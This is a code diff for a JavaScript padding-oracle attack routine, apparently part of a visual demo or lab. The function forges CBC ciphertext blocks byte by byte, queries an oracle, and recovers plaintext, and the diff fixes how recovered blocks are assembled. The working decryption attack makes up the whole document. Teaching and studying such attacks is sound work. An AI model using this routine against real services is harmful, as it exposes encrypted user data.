@@ -7,7 +7,6 @@ export async function runPaddingAttack(
   speed = 0,
   fastMode = true
 ) {
-  const originalBytes = base64ToBytes(cipher);
   const blocks = splitBlocks(cipher);
 
   let plaintextBytes = [];
@@ -19,39 +18,33 @@ export async function runPaddingAttack(
     const curr = blocks[b];
 
     let recovered = new Uint8Array(16);
-    let modified = new Uint8Array(prev); // working copy
+    let modified = new Uint8Array(prev);
 
     for (let i = 15; i >= 0; i--) {
       const pad = 16 - i;
       let found = false;
 
       for (let guess = 0; guess < 256; guess++) {
-        // reset modified block
         modified = new Uint8Array(prev);
 
-        // apply padding to solved bytes
         for (let k = i + 1; k < 16; k++) {
-          modified[k] =
-            prev[k] ^ recovered[k] ^ pad;
+          modified[k] = prev[k] ^ recovered[k] ^ pad;
         }
 
-        // set current guess
         modified[i] = guess;
 
-        // construct forged ciphertext
         const forged = new Uint8Array(16 + curr.length);
         forged.set(modified, 0);
         forged.set(curr, 16);
 
         const payload = bytesToBase64(forged);
-
         const res = await oracle(payload);
 
         if (res.status !== "valid") {
           if (!fastMode) {
             onUpdate({
-              block: Number(b),
-              byte:  Number(i),
+              block: b,
+              byte: i,
               guess,
               status: "invalid",
             });
@@ -59,14 +52,11 @@ export async function runPaddingAttack(
           continue;
         }
 
-        // ---- VALID BYTE FOUND ----
+        // valid byte found
         recovered[i] = guess ^ pad ^ prev[i];
-
-        plaintextBytes.unshift(recovered[i]);
         processed++;
 
-        const progress =
-          (processed / totalBytes) * 100;
+        const progress = (processed / totalBytes) * 100;
 
         onUpdate({
           block: b,
@@ -75,7 +65,7 @@ export async function runPaddingAttack(
           status: "valid",
           progress,
           recoveredText: new TextDecoder().decode(
-            new Uint8Array(plaintextBytes)
+            new Uint8Array([...plaintextBytes, ...recovered])
           ),
         });
 
@@ -88,14 +78,13 @@ export async function runPaddingAttack(
       }
 
       if (!fastMode && speed > 0) {
-        await new Promise((r) =>
-          setTimeout(r, speed)
-        );
+        await new Promise((r) => setTimeout(r, speed));
       }
     }
+
+    // append full block AFTER finishing it
+    plaintextBytes.push(...recovered);
   }
 
-  return new TextDecoder().decode(
-    new Uint8Array(plaintextBytes)
-  );
+  return new TextDecoder().decode(new Uint8Array(plaintextBytes));
 }
